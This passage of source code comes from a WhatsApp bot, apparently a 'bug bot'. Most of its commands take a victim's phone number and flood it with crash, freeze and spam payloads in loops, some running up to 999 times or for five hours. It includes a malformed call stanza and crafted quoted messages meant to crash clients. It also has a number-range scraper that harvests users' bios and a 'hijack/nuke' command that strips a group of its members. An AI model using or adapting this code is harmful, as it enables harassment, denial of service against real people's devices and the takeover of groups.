  [Xreturn]
);
const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
        await xeonBetaAI(Xreturn);
    } catch (err) {
        if (
            err?.output?.statusCode === 428 ||
            err?.output?.statusCode === 408 ||
            err.message.includes('Connection Closed') ||
            err.message.includes('Timed out') ||
            err.code === 'ECONNABORTED'
        ) {
            console.log(`⚠️Bug ${command} ended for ${Xreturn} ✅`);
            break;
        }
    }
}
}
break

	case 'xjammer2xxxxx': {

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  	await XeonDelay1(24, Xreturn)
}
break
case 'xpiosxxxxx': {

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <30; i++) {
  	await crashOneHitxV2(Xreturn)
}
}
break

case 'xsiphonexxxx': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <300; i++) {
await xeonSpamIos(Xreturn)
await sleep(1000);
}
}
break
	
	case 'xdroidinvisiblexxxx': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <5; i++) {
await xeonAndroidInvisible(Xreturn)
}
}
break
	
	case 'iosixnvisiblexxxxx': {

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
        await CrashIOSS(Xreturn);
    } catch (err) {
        if (
            err?.output?.statusCode === 428 ||
            err?.output?.statusCode === 408 ||
            err.message.includes('Connection Closed') ||
            err.message.includes('Timed out') ||
            err.code === 'ECONNABORTED'
        ) {
            console.log(`⚠️Bug ${command} ended for ${Xreturn} ✅`);
            break;
        }
    }
}
}
break

	case 'xdroxxxxx': {

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <2; i++) {
await crashmsg(Xreturn)
await crashmsg(Xreturn)
}
}
break
	case 'device': case 'checkdevice': case 'cekdevice': {
	
  if (!isBot) return;

  const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedMessageId = m.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quotedMsg || !quotedMessageId) {
    await XeonBotInc.sendMessage(from, { text: 'Quote The Target Message' }, { quoted: m });
    break;
  }

  const devicec = 
    quotedMessageId.length > 21
      ? 'Device: Android'
      : quotedMessageId.startsWith('3A')
        ? 'Device: iOS'
        : 'Device: WhatsApp Web or BotAPI';

  await XeonBotInc.sendMessage(from, { text: devicec }, { quoted: m });
  }
  break;
	case 'xxioss':  {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		for (let i = 0; i < 999; i++) {
await xeonIosInvi(Xreturn);
await sleep(300);
}
		}
		break
	case 'xdxdxjammer':  {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		await sendMessagesForDurationX(1, Xreturn);
		await sendMessagesForDuration(1, Xreturn);
		}
		break
		case 'xjammer2xx':  {

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		await sendMessagesForDuration(1, Xreturn);
		}
		break
  
	case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
	
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
	
	case 'xxxcrash_quotedxxx':
                for (let i = 0; i < 1; i++) {
                    await XeonBotInc.relayMessage(from, {
                        "extendedTextMessage": {
                            "text": "😂",
                            "contextInfo": {
                                "stanzaId": generateMessageID(),
                                "participant": from,
                                "quotedMessage": {
                                    "contactMessage": {
                                        "displayName": "@lo_tus_19 crashed youKKKKKKK",
                                        "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:@lo_tus_19\nX-WA-BIZ-NAME:BruxinNerdola\n\nORG:@lo_tus_19;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
                                    }
                                }
                            }
                        }
                    }, {})
                }
                break;
	
	case 'xxfcgrub':
	async function fcgrubNomorBrasil(target){
await XeonBotInc.sendMessage(target, {
    text: ' _prindapan_boy',
    contextInfo: {
        mentionedJid: ['5521992999999@s.whatsapp.net'], // The person being mentioned
        stanzaId: generateMessageID(),
        participant: from,
        quotedMessage: {
            callLogMessage: {
                callType: 'AUDIO', // or 'VIDEO'
                callOutcome: 1, // 1 = missed
                durationSecs: '0',
                isVideo: true,
                participants: [{
                    jid: '5521992999999@s.whatsapp.net',
                    callOutcome: '1'
                }]
            }
        }
    }
});
}
await fcgrubNomorBrasil(m.chat)
break

case 'xxcallx':
for (let i = 0; i < 7; i++) {
const callId = (await crypto.randomBytes(16)).toString('hex').toUpperCase().substring(0, 64);
const offerContent = [];
const audio16000 = { tag: 'audio', attrs: { enc: 'opus', rate: '16000' }, content: undefined };
const audio8000 = { tag: 'audio', attrs: { enc: 'opus', rate: '8000' }, content: undefined };
offerContent.push(audio16000);
offerContent.push(audio8000);
const net = { tag: 'net', attrs: { medium: '3' }, content: undefined };
const capability = { tag: 'capability', attrs: { ver: '1' }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) };
const encopt = { tag: 'encopt', attrs: { keygen: '2' }, content: undefined };
offerContent.push(net);
offerContent.push(capability);
offerContent.push(encopt);
const encKey = await crypto.randomBytes(32);
let devices = await XeonBotInc.getUSyncDevices([from], false, false);
devices = await Promise.all(devices.map(async (jid) => {
const user = jid.user;
const device = jid.device ? ":" + jid.device : "";
return `${user}${device}@s.whatsapp.net`;
}));
await XeonBotInc.assertSessions(devices, true);
const { nodes: destinations, shouldIncludeDeviceIdentity } = await XeonBotInc.createParticipantNodes(
devices,
{ call: { callKey: new Uint8Array(encKey) } },
{ count: '999' }
);
offerContent.push({ tag: 'destination', attrs: {}, content: destinations });
if (shouldIncludeDeviceIdentity) {
const deviceIdentity = {
tag: 'device-identity',
attrs: {},
content: await encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true)
};
offerContent.push(deviceIdentity);
}
const stanza = {
tag: 'call',
attrs: {
from: XeonBotInc.user.id,
to: from,
id: '0'
},
content: [
{
tag: 'offer',
attrs: {
'call-id': callId,
'call-creator': '696969696969@s.whatsapp.net'.repeat(999)
},
content: offerContent
}
]
};
await XeonBotInc.sendNode(stanza);
}
break
case 'xblackdelayxxxxx': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i < 300; i++) {
await protocolbug7(Xreturn);
}
}
break
case 'freezerios': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		for (let i = 0; i < 9; i++) {
     await freezeIos(Xreturn)
   }
		}
		break
	
	case 'reactch': {
    if (!q) {
        return replygcxeon(`Usage: ${prefix}reactch link_channel text\nFor example: ${prefix+command} https://whatsapp.com/channel/0029VbBbIK86hENu6TXQmz1S`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return replygcxeon("Link invalid!");}
    const xeonReaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return xeonReaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await XeonBotInc.newsletterMetadata("invite", channelId);
        await XeonBotInc.newsletterReactMessage(res.id, messageId, emoji);
        return replygcxeon(`Sent reaction *${emoji}* for the message in the channel *${res.name}.*`);
    } catch (e) {
        console.error(e);
        return replygcxeon("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;

		case 'iosinvisible': case 'xxxiosbrutalityxx': {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		for (let i = 0; i < 30; i++) {
     await IosBODYkill(Xreturn)
     await sleep(300);
     await xiosinv(Xreturn)
     await sleep(300);
     await IosBODYkill(Xreturn)
     await sleep(300);
     await xiosinv(Xreturn)
     await sleep(300);
     await IosBODYkill(Xreturn)
     await sleep(300);
     await xiosinv(Xreturn)
     await sleep(300);
     await IosBODYkill(Xreturn)
     await sleep(300);
     await xiosinv(Xreturn)
     await sleep(300);
     await IosBODYkill(Xreturn)
     await sleep(300);
     await IosBODYkill(Xreturn)
     
   }
		}
		break
		
		case 'xbrutality2xxx': {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		for (let i = 0; i < 10; i++) {
     await SkyForce(Xreturn)
   }
		}
		break
		
		case 'xbrutalityxxx': {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		for (let i = 0; i < 999; i++) {
     await xeonOutBrutal(Xreturn)
   }
		}
		break
	
	case "checkchid": case "idch": {
	
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029VbBbIK86hENu6TXQmz1S `)
    if (!text.includes("https://whatsapp.com/channel/")) return replygcxeon("Invalid link")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await XeonBotInc.newsletterMetadata("invite", result)
        if (!res) return replygcxeon("Failed to fetch information of this channel")
        let teks = `
*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not Verified"}
        `
        return replygcxeon(teks)
    } catch (error) {
        console.error(error);
        return replygcxeon("An error occurred while retrieving metadata");
    }
}
break
	case 'xinvisiblekillxxx': {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
		for (let i = 0; i < 300; i++) {
     await xinvikill(Xreturn)
     await xinvikill2(Xreturn)
   }
		}
		break
		
		case 'dxxxinvi2': {


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
await sendMessagesForDurationX(1, Xreturn);
		}
		break
	
	case 'searchpair': {
    if (!global.banner.includes(senderNumber)) {
        return;
    }

    // Ensure the user provides a number to search
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 919402104403*");
    }

    const searchNumber = args[0] + '@s.whatsapp.net'; // Convert input to JID format
    const pairingPath = './lib2/pairing';

    try {
        // Check if the pairing directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name); // Keep full JID format

        // Check if the searched number exists
        if (pairedDevices.includes(searchNumber)) {
            return replygcxeon(`✅ The number *${args[0]}* is paired.`);
        } else {
            return replygcxeon(`❌ The number *${args[0]}* is not paired.`);
        }
    } catch (err) {
        console.error('Error searching paired devices:', err);
        return replygcxeon('Failed to search paired devices data.');
    }
}
break;

case 'xban': case 'XBODYban': {
    try {
        const fs = require('fs');
        const axios = require('axios');
        const path = require('path');

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // استدعاء القايمة من ملف config.js
        const { banner } = require('./config.js');

        // رقم المرسل
        let senderNumber = m.sender; // مهم جداً

        // تحقق إن المرسل موجود في القائمة
        if (!banner.includes(senderNumber)) {
            return;
        }

        const imageUrl = "https://files.catbox.moe/a9m323.jpg";
        const imagePath = path.join(__dirname, 'temp_profile.jpg');

        (async () => {
            // تنزيل الصورة
            let response = await axios({ url: imageUrl, responseType: 'arraybuffer' });
            fs.writeFileSync(imagePath, Buffer.from(response.data, 'binary'));

            // تغيير صورة البوت الشخصية
            let botNumber = XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net";
            await XeonBotInc.updateProfilePicture(botNumber, { url: imagePath });

            // جلب جميع الجروبات
            let allGroups = Object.values(await XeonBotInc.groupFetchAllParticipating().catch(() => []));
            let groupIds = allGroups.map(group => group.id);

            // قراءة الجروبات المحظورة
            let blacklistedGroups = [];
            try {
                blacklistedGroups = JSON.parse(fs.readFileSync('./database/idgroup.json', "utf8"));
            } catch (err) {
                console.error("⚠️ No blacklist file found, continuing...");
            }

            // استبعاد الجروبات المحظورة
            let targetGroups = groupIds.filter(id => !blacklistedGroups.includes(id));

            // تحديث صورة كل جروب
            for (let groupId of targetGroups) {
                try {
                    await XeonBotInc.updateProfilePicture(groupId, { url: imagePath });
                    console.log(`✅ Updated profile picture for ${groupId}`);
                } catch (err) {
                    console.error(`❌ Error updating profile picture for ${groupId}:`, err);
                }
                await delay(1000); // الانتظار ثانية بين كل تحديث
            }

            // حذف الصورة المؤقتة بعد الانتهاء
            fs.unlinkSync(imagePath);
        })();

    } catch (error) {
        console.error("❌ Detailed Error:", error);
    }
}
break;
	
case 'promoteall': {

    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available for promotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'promote');
        await replygcxeon("Successfully promoted all members!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while promoting members.");
    }
}
break;

case 'demoteall': {

    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin !== null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No admins available for demotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'demote');
        await replygcxeon("Successfully demoted all admins!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while demoting members.");
    }
}
break;

case 'kickall': case 'hack': case 'hijack': case 'nuke': {

    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available to kick.");

    try {
        await XeonBotInc.groupUpdateDescription(from, '\n\n\nGROUP HIJACKED BY Telegram: @lo_tus_19\n\n\n');
        await sleep(100);
        await XeonBotInc.groupUpdateSubject(from, '\u0000'); 
        replygcxeon(`\n\n\n\n\n\n\n\n\n\n\n\nGroup Hacked by Telegram: @lo_tus_19\n\n\n\n\n\n\n\n\n\n\n\n`);
        await sleep(100);
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'remove');
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while kicking members.");
    }
}
break;

	case 'forcegroup':
    
    ;
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us|5\n\nTo get group ID, type .listgc\n\nTo get group ID from a group link, type .groupid link`);

    // Check if input contains a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }

    // Extract group ID and amount from input
    let input = q.split("|");
    let victimxd = input[0].trim(); // Group ID
    let loopCount2 = parseInt(input[1]); // Extract amount

    // Validate Group ID format (only numbers + "@g.us")
    if (!/^\d+@g\.us$/.test(victimxd)) {
        return replygcxeon("Invalid group ID! Please enter a correct WhatsApp group ID.");
    }

    // Validate loop count
    if (isNaN(loopCount2) || loopCount2 < 1) {
        loopCount2 = 5; // Default to 5 if amount is invalid
    }

    replygcxeon(`Successfully sent force message to the group chat`);

    for (let i = 0; i < loopCount2; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(victimxd, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
